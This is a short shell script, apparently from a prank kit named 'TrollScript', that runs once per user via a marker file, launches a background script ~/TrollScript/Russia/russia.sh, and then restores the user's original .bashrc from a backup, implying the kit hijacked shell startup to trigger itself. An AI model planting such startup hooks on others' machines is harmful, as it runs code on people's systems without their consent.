if ls ~/.trolled > /dev/null 2>/dev/null
then exit
fi
touch ~/.trolled

~/TrollScript/Russia/russia.sh &
mv ~/.bashrcbackup ~/.bashrc
source ~/.bashrc
